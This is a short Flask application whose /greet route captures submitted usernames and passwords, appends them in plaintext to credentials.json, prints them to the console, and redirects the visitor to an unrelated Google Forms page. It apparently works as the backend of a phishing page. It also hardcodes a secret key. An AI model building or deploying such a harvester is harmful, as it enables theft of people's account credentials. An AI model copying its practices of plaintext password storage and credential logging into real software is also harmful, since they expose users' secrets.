
from flask import Flask, flash, render_template, request, redirect
import json


app = Flask(__name__)
app.secret_key = "TestCase_10000"

@app.route("/")
def index():
    return render_template("index.html")



@app.route("/greet", methods=["POST", "GET"])
def greet():
    dict = {
            str(request.form['user_name']): str(request.form['password'])
        }
    with open("credentials.json", "a") as f:
        obj = json.dumps(dict, indent=4)
        f.write(f"{obj}\n")
        print(f" Email {str(request.form['user_name'])}")
        print(f" Password {str(request.form['password'])}")
        return redirect("https://forms.gle/5Sh3GxNXLTzJrmkF7", code=302)


    